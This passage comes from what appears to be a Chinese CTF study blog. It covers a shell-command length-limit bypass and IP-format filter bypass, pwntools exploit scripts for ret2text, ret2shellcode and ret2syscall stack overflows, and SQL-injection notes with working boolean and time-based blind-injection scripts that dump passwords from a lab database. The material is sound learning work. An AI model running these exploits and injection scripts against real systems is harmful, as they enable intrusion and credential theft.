环境下相对换行</p><h3 id="ip地址过滤绕过"><a href="#ip地址过滤绕过" class="headerlink" title="ip地址过滤绕过"></a>ip地址过滤绕过</h3><p>网络地址除了我们所知道’127.0.0.1’.网络地址有另外一种表示形式，就是数字地址,比如127.0.0.1’的10进制数字地址就是’2130706433’、16进制数字地址就是’0x7f000001’。</p><p><img src="image-20200628110922775.png" alt="image-20200628110922775"></p><p>附带一个自己写的渣转化ip的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipv4_addr_check</span><span class="params">(ipAddr)</span>:</span></span><br><span class="line">    p = re.compile(<span class="string">'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d\d?)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.match(ipAddr):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipv4_addr_change</span><span class="params">(ipAddr)</span>:</span></span><br><span class="line">    List=ipAddr.split(<span class="string">'.'</span>)</span><br><span class="line">    IP=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> List:</span><br><span class="line">        i=bin(int(i))[<span class="number">2</span>:]</span><br><span class="line">        n=<span class="number">8</span>-len(i)</span><br><span class="line">        IP=IP+<span class="string">'0'</span>*n+i</span><br><span class="line">    print(<span class="string">'dec ip is'</span>,int(<span class="string">'0b'</span>+IP,<span class="number">2</span>))</span><br><span class="line">    print(<span class="string">'hex ip is '</span>,hex(int(<span class="string">'0b'</span>+IP,<span class="number">2</span>)))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    x=<span class="string">'127.0.0.1'</span></span><br><span class="line">    <span class="keyword">if</span> ipv4_addr_check(x):</span><br><span class="line">       ipv4_addr_change(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'it is not ipv4'</span>)</span><br></pre></td></tr></table></figure><h4 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h4><p>如果shell对一次性输入的命令有长度限制比如一次不超过8个字符。我们可以通过’\‘符号可以拼接命令的特性、’ls -t’可以把文件按规律排序、sh or bash 把接收的参数当命令执行的特点。将命令写成有规律的文件名 ，再通过’ls -t’ 与 sh  排序执行。</p><p>以<code>cat -n flag.txt</code>为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">g.txt   <span class="comment">#命名倒着写，命令最后的写前面</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">fla\\   <span class="comment">#注意第二个文件起要加\号且要转义</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="string">'t -n \'</span> <span class="comment">#可以使用‘’号但是要耗掉2个字符长度，另外注意空格</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ca\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20200628214136448.png" alt="image-20200628214136448"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>恍恍惚惚地发现总结这些关于linux的常用的姿势，居然断断续续用了近天的时间。对于这些知识，有的平时在看payload时感觉很简单。但是在静下心来分析原理时，就会发现有很多看似简单的东西，背后细节不一般，比如重定向‘&gt;&amp;’与’&amp;&gt;’的含义异同；特殊变量’$*’与‘$@’的取值；长度限制绕过文件编写要注意命名的分割。花这么多时间整理下来，也学到很多意想不到的知识。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的N种方式</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11661017.html" target="_blank" rel="noopener">CTF中的命令执行绕过方式</a></p><p><a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener">Bypass一些命令注入限制的姿势</a></p><p><a href="https://blog.csdn.net/weixin_43921596/article/details/86638919" target="_blank" rel="noopener">Linux下绕过空格的方式总结</a></p><p><a href="https://superuser.com/questions/335396/what-is-the-difference-between-and-in-bash" target="_blank" rel="noopener">&gt;&amp;与&amp;&gt;有区别吗</a></p><p><a href="http://www.tldp.org/LDP/abs/html/io-redirection.html" target="_blank" rel="noopener">linux重定向</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">Linux下几种反弹Shell方法的总结与理解</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank" rel="noopener">7位可控字符下的任意命令执行</a>z</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn小记(1)</title>
      <link href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/"/>
      <url>/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/</url>
      
        <content type="html"><![CDATA[<p>某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。</p><a id="more"></a><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><p><img src="image-20200909214148691.png" alt="image-20200909214148691"></p><p>如图，想要利用触发栈溢出程序必须向<strong>栈上写入数据</strong>和<strong>写入的数据大小没有被良好地控制</strong></p><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><h4 id="关于输入的危险函数"><a href="#关于输入的危险函数" class="headerlink" title="关于输入的危险函数"></a>关于输入的危险函数</h4><p>​    gets()，直接读取一行，忽略’\x00’<br>​            scanf()<br>​            vscanf()</p><h4 id="关于输出的危险函数"><a href="#关于输出的危险函数" class="headerlink" title="关于输出的危险函数"></a>关于输出的危险函数</h4><p>   sprintf()</p><h4 id="关于字符串操作的危险函数"><a href="#关于字符串操作的危险函数" class="headerlink" title="关于字符串操作的危险函数"></a>关于字符串操作的危险函数</h4><p>​    strcpy，字符串复制，遇到’\x00’停止<br>​            strcat，字符串拼接，遇到’\x00’停止<br>​            bcopy</p><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li><li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li><li>覆盖 bss 段某个变量的内容。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>ps：我们覆盖某个地址的目的是为了让程序读取我们覆盖的恶意地址来达到我们的目的，执行我们想要执行的东西。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>emm,这道题保护只开了栈不可执行,对我来说影响深刻的反而是找buf的大小的问题。</p><p><img src="image-20200911231138664.png" alt="image-20200911231138664"></p><p>照着以前对pwn薄弱理解，打开ide看到了：</p><p><img src="image-20200911220549058.png" alt="image-20200911220549058"></p><p>然后照ebp算出的要溢出：0x64+4个（104）字符才能溢出到返回地址。</p><p>但是在gdb出来却是：</p><p><img src="image-20200911110700992.png" alt="image-20200911110700992"></p><p>经过测试要溢出的字符的确是108个。才能覆盖返回地址。</p><p>通过收查资料发现，ebp存储着当前栈帧的栈底的地址是通常作为基址。而变量地址是通过通过ebp和偏移相加减来获取。但esp始终指向栈顶，随栈内数据增加或减少而变。同时ida是IDA是静态调试gdb是动态调试，所以ida计算偏移可能有误差，导致我们通过ebp计算出来有误差。（所以还是最好用动态调试）</p><p>然后就返回地址的问题，这里学到一个新的知识吧，返回0x804864A就可以将/bin/sh传入system执行。（</p><p><img src="image-20200911223653876.png" alt="image-20200911223653876"></p><p>然后溢出大小控制了返回地址也确定了，这题就好做了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">108</span>+<span class="string">'bbbb'</span>+p32(<span class="number">0x0804863A</span>) </span><br><span class="line"><span class="comment">#pay='a'*108+'bbbb'+p32(e.got['system'])+p32(0)+p32(0x08048763)#这个是调用system手动传入内置的‘/bin/sh’</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题没有看到system与/bin/sh，但看到nx没防护,在vmap下发现buf有读写执行的能力,所以想要手动写入shell。</p><p><img src="image-20200912105057908.png" alt="image-20200912105057908"></p><p><img src="image-20200912115324139.png" alt="image-20200912115324139"></p><p>于是借着strncpy写入shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shell=asm(shellcraft.sh())</span><br><span class="line">lang=<span class="number">108</span>+<span class="number">4</span>-len(shell)</span><br><span class="line">pay=shell+<span class="string">'a'</span>*lang+p32(<span class="number">0x0804A080</span>)<span class="comment">#让buf前面是shell，后面是溢出数据，最后是buf地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>这道题,本菜鸡感觉学到两个知识点用系统调用的方法来处理函数和ROPgadget的使用.当我们获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。于是我们可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br><span class="line">可以理解为调用int 0x80(eax,ebx,ecx,edx)</span><br><span class="line">即：</span><br><span class="line">系统调用号，即 eax 应该为表execve的 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br><span class="line"></span><br><span class="line">构造payload的框架大体是：</span><br><span class="line">溢出数据 eax地址 eax的值 ebx地址  ebx值  ecx地址 ecx 值 edx 值 edx 值 0x80地址</span><br></pre></td></tr></table></figure><p>eax、ebx、ecx、edx这些寄存器可以地址可以用ROPgadget来得到。这里说下ROPgadge是使用</p><p>查找可存储寄存器的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep  '寄存器'</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure><p>查找某字符串地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string  "字符串“</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop --string "/bin/sh"</span><br></pre></td></tr></table></figure><p>查找有int 0x80的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br></pre></td></tr></table></figure><p>这样下来payload就容易构造了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">e=ELF(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(<span class="number">0x080bb196</span>)+p32(<span class="number">0xb</span>)+p32(<span class="number">0x0806eb90</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080be408</span>)+p32(<span class="number">0x08049421</span>)</span><br><span class="line"><span class="comment">#pay溢出数据+eax地址+eax的值+ebx地址+ebx值+ecx地址+ecx 值 +edx 地址 +edx 值+0x80地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ps：由于v0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   ，so先传cdx，ecx，再ebx。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p><p><a href="https://www.jianshu.com/p/dd5fd511e0d3" target="_blank" rel="noopener">https://www.jianshu.com/p/dd5fd511e0d3</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SQL注入小记</title>
      <link href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>sql注入产生的原因是未对用户输入进行处理，导致输入的恶意信息与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。</p><a id="more"></a><h2 id="sql注入思路"><a href="#sql注入思路" class="headerlink" title="sql注入思路"></a>sql注入思路</h2><p>1.寻找注入点</p><p>2.确定注入类型</p><p>​     1)若页面有明显变化:联合查询注入。</p><p>​     2)若页面有报错回显:报错注入。</p><p>​     3)只用正确与错误的回显或无回显:盲注(布尔盲注,时间盲注)。</p><p>3.利用自带函数查询数据库信息.database()查询当前数据库名、user()查数据库用户、version()查数据库版本等。</p><p>4.查库名-&gt;查表名-&gt;查字段名-&gt;查数据 ,以达到目的.</p><h2 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h2><h3 id="1-用二分法确定字段数量"><a href="#1-用二分法确定字段数量" class="headerlink" title="1)用二分法确定字段数量"></a>1)用二分法确定字段数量</h3><p>使用<code>order/group by</code>语句。通过往后边拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于或等于，则页面正常从而找到字段的数量。</p><h3 id="2-判断页面回显数据的字段位置"><a href="#2-判断页面回显数据的字段位置" class="headerlink" title="2)判断页面回显数据的字段位置"></a>2)判断页面回显数据的字段位置</h3><p>使用union select 1,2,3,4,x… 我们定义的数字将显示在页面上，即可从中页面显示的数字所在的位置推断出可以利用的字符串的位置。</p><h3 id="3-利用sql内置函数进行信息收集"><a href="#3-利用sql内置函数进行信息收集" class="headerlink" title="3)利用sql内置函数进行信息收集"></a>3)利用sql内置函数进行信息收集</h3><p>database()查询当前数据库名、user()查询数据库账号、version()查询数据库版本等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p><h3 id="4-1-若Mysql版本-gt-5-0"><a href="#4-1-若Mysql版本-gt-5-0" class="headerlink" title="4.1)若Mysql版本&gt;=5.0"></a>4.1)若Mysql版本&gt;=5.0</h3><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库 information_schema ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 </p><p>具体而言:</p><p>SCHEMATA</p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p>TABLES</p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p>COLUMNS</p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h4 id="1-查询数据库中的所有库名"><a href="#1-查询数据库中的所有库名" class="headerlink" title="(1)查询数据库中的所有库名"></a>(1)查询数据库中的所有库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  schema_name <span class="keyword">FROM</span> information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="2-获取数据库中的表"><a href="#2-获取数据库中的表" class="headerlink" title="(2)获取数据库中的表"></a>(2)获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><h4 id="3-获取数据库中的表"><a href="#3-获取数据库中的表" class="headerlink" title="(3)获取数据库中的表"></a>(3)获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(table_name)#此表名可以为字符串型，也可以十六进制表示</span><br></pre></td></tr></table></figure><h4 id="4-获取信息"><a href="#4-获取信息" class="headerlink" title="(4)获取信息"></a>(4)获取信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(*) from table_name</span><br><span class="line">(or)</span><br><span class="line">select null,group_concat(&#39;column_name&#39;) from (&#39;table_name&#39;)</span><br></pre></td></tr></table></figure><h3 id="4-2-Mysql版本-lt-5-0"><a href="#4-2-Mysql版本-lt-5-0" class="headerlink" title="4.2)Mysql版本&lt;5.0"></a>4.2)Mysql版本&lt;5.0</h3><p>mysql的低版本缺乏系统库information_schema，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜或是通过盲注.</p><h2 id="盲注的方法"><a href="#盲注的方法" class="headerlink" title="盲注的方法"></a>盲注的方法</h2><p>在提交时，正确页面与错误页面相比有变化，则使用布尔的盲注。正确页面与错误页面无变化，使用时间注入。</p><p>但无论是布尔还时间都会用到，下面盲注常用的函数：<br>        (1)length(str) ：返回字符串str的长度</p><p>(2)substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p>(3)mid(str,pos,len) ：跟上面的一样，截取字符串</p><p>(4)ascii(str) ：返回字符串str的最左面字符的ASCII代码值</p><p>(5)ord(str) ：将字符或布尔类型转成ascll码</p><p>(6)if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h4><p>通过构造substr或mid函数来，截取返回值的结果中某一个字符。再利正确页面与错误页面不同的特性，来枚举出来。</p><p>布尔注入脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenth</span><span class="params">(sql,jiao)</span>:</span><span class="comment">#爆破长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and length(('</span>+sql+<span class="string">'))&gt;'</span>+str(i)).text))==jiao:</span><br><span class="line">             <span class="keyword">return</span> (i)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">substrchr</span><span class="params">(sql,jiao,strlen)</span>:</span><span class="comment">#爆破内容</span></span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,strlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span>(len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and ascii(substr(('</span>+sql+<span class="string">'),'</span>+str(k)+<span class="string">',1))&gt;'</span>+str(i)).text))==jiao:                </span><br><span class="line">                w=w+chr(i)</span><br><span class="line">                print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (w)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#zheng=len(requests.get('http://192.168.14.137/Less-2/?id=1').text)#721</span></span><br><span class="line"></span><br><span class="line">jiao=len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and length(database())&gt;1111'</span>).text)<span class="comment">#670</span></span><br><span class="line"><span class="comment">#sql='select database()' //爆当前库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名</span></span><br><span class="line">sql=<span class="string">'select group_concat(password) from users'</span> <span class="comment">#爆内容</span></span><br><span class="line"></span><br><span class="line">w=lenth(sql,jiao)</span><br><span class="line"></span><br><span class="line">w=substrchr(sql,jiao,w)</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过判断页面返回内容的响应时间差异进行条件判断。通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p><p>简单的时间盲注入脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenth</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">         start=time.time()</span><br><span class="line">         requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and if(length(('</span>+sql+<span class="string">'))&gt;'</span>+str(i)+<span class="string">',1,sleep(3) )'</span>)</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">if</span>((time.time()-start)&gt;<span class="number">3</span>):</span><br><span class="line">             print(<span class="string">'长度是'</span>+str(i))</span><br><span class="line">             <span class="keyword">return</span> (i)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">substrchr</span><span class="params">(sql,strlen)</span>:</span></span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,strlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">             start=time.time()</span><br><span class="line">             requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and if(ascii(substr(('</span>+sql+<span class="string">'),'</span>+str(k)+<span class="string">',1))&gt;'</span>+str(i)+<span class="string">',1,sleep(2))'</span>)</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">if</span>((time.time()-start)&gt;<span class="number">2</span>):              </span><br><span class="line">                w=w+chr(i)</span><br><span class="line">                print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (w)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sql='select database()' #爆当前库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(password) from users' #爆内容</span></span><br><span class="line"></span><br><span class="line">long=lenth(sql)</span><br><span class="line"></span><br><span class="line">text=substrchr(sql,long)</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>通过特殊函数的错误使用使其参数被页面输出。</p><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p><p>常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等</p><p><a 